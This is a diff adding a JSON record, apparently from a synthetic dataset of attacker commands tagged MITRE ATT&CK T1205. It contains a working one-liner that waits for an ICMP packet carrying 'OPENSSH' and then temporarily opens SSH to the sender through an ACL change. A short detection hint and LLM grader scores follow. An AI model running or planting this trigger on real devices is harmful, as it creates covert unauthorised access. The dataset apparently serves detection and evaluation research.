@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,ICMP,Raw; import os; p=sniff(filter=\"icmp[icmptype]==8\", lfilter=lambda x: x.haslayer(Raw) and b\"OPENSSH\" in bytes(x[Raw].load), count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-ICMP; permit tcp host {p[IP].src} any eq 22\\\" && (sleep 120; ciscoconf --apply \\\"ip access-list extended MGMT-ICMP; no permit tcp host {p[IP].src} any eq 22\\\") &\")'",
+  "explanation": "Listens for an ICMP Echo containing the magic string OPENSSH and temporarily inserts an ACL permitting SSH from the source for 120 seconds via ciscoconf. Requires sudo due to raw packet sniffing.",
+  "rationale_steps": [
+    "Sniff ICMP echo requests and match a magic payload as the signal.",
+    "On match, push a temporary ACL entry via ciscoconf permitting TCP/22 from the sender, then remove it after 120s.",
+    "Traffic signaling is achieved using a non-standard ICMP payload trigger.",
+    "Detection: inspect ICMP payloads for strings like OPENSSH and audit ACL change logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-087b5a8c",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command has balanced quotes and parentheses, valid Python and shell syntax, correctly escaped inner quotes, and a well-formed f-string and command chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements traffic signaling by sniffing for an ICMP echo containing a magic token and then temporarily permitting SSH from the sender, but relies on nonstandard tooling (ciscoconf) and the presence of scapy/sudo on the target network device.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:47:05.394502Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid Python and shell syntax, and correct f-string interpolation for constructing the `os.system` command.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1205 by using a specific ICMP payload as a signal to trigger a highly sensitive, time-limited network configuration change, demonstrating operational plausibility for an adversary.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:47:24.556900Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
